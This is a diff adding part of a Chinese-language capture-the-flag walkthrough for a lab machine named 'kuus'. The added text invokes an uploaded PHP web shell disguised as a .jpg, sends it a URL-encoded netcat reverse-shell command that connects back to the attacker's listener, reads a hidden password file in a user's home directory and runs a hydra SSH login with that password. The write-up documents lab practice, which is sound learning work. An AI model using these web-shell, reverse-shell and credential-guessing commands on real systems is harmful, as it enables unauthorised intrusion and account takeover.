@@ -57,3 +57,43 @@ Upload
 -----------------------------58834982911681499741555270890--
 ```
 
+访问http://192.168.18.238/upload/1.php.jpg?cmd=id
+
+反弹shell
+```css
+http://192.168.18.238/upload/1.php.jpg?cmd=nc%20-e%20/bin/bash%20192.168.44.128%209001
+
+
+┌──(kali㉿kali)-[~]
+└─$ nc -lnvp 9001
+listening on [any] 9001 ...
+connect to [192.168.44.128] from (UNKNOWN) [192.168.44.10] 4854
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+script /dev/null -c bash
+Script started, file is /dev/null
+www-data@kuus:/var/www/html/upload$ 
+
+```
+
+# 提权
+tignasse 账号下有个.pass.txt 文件，但是经过测试并没有用
+尝试常规的sudo\suid\内核\任务计划\进程分析手段、爆破了一段时间之后,也没结果。实在不想浪费时间了，看了别人的writeup，才知道。这里密码另有隐情！
+```c
+www-data@kuus:/home$ ls
+ls
+mister_b  tignasse
+
+www-data@kuus:/home/tignasse$ more .pass.txt
+more .pass.txt
+716n4553
+www-data@kuus:/home/tignasse$ cat .pass.txt
+cat .pass.txt
+Try harder !
+
+```
+
+hydra
+```c
+hydra -l tignasse -p 716n4553 ssh://192.168.18.238
+```
